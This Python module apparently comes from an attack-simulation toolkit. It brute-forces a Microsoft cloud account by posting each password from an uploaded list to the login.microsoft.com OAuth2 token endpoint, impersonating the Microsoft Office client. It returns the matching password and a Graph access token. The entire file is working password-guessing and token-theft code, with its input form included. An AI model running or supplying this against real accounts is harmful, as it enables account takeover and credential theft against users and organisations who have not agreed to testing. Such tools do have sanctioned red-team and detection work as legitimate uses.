import requests
import base64
import time

def TechniqueMain(user_name, wait = None, client_id = None, password_file_content = None):
    '''Generates graph access token by authenticating with a username & password'''

    endpoint_url = "https://login.microsoft.com/common/oauth2/token"
    resource = "https://graph.microsoft.com"
    scope = ['openid']
    
    headers = {
        "Accept" : "application/json",
        "Content-Type" : "application/x-www-form-urlencoded"
    }

    if client_id in [None, ""]:
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c" #Setting the default client to use if user does not specify

    if wait in [None,""]:
        wait = 5

    #Extract data out of the text file
    content_string = password_file_content[0].split(',')[-1]
    decoded = base64.b64decode(content_string)
    try:
        text = decoded.decode('utf-8')
        passwords_list = text.split('\n')
    except:
        return "Failed bruteforce"

    #Start bruteforce
    for password in passwords_list:
        data = {
            "grant_type": "password",
            "password" : password,
            "client_id" : client_id,
            "username" : user_name,
            "resource" : resource,
            "scope" : ' '.join(scope)
        }

        '''Request access token'''
        try:
            token_request = requests.post(url = endpoint_url, headers = headers, data = data).json()
            
            #Checking for failed authentication
            if 'error_codes' in token_request:
                    raise Exception("Invalid Password")

            access_token = token_request['access_token']
            return {"Password" : password, "Access_Token": access_token}

        except Exception as e:
            time.sleep(wait)
    
    return "Bruteforce failed"


def TechniqueInputSrc():
    '''Returns the input fields required as parameters for the technique execution'''

    return [
        {"title" : "Username", "id" : "bf-text-input-username", "type" : "text", "placeholder" : "user@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Wait (Seconds)", "id" : "bf-wait-input", "type" : "number", "placeholder" : "5", "element_type" : "dcc.Input"},
        {"title" : "App ID (Optional)", "id" : "bf-client-id-text-input", "type" : "text", "placeholder" : "Optional (Default: Microsoft Office)", "element_type" : "dcc.Input"},
        {"title" : "Password File", "id" : "bf-password-file-uploader", "type" : "password", "placeholder" : "you got this right?", "element_type" : "dcc.Upload"}
    ]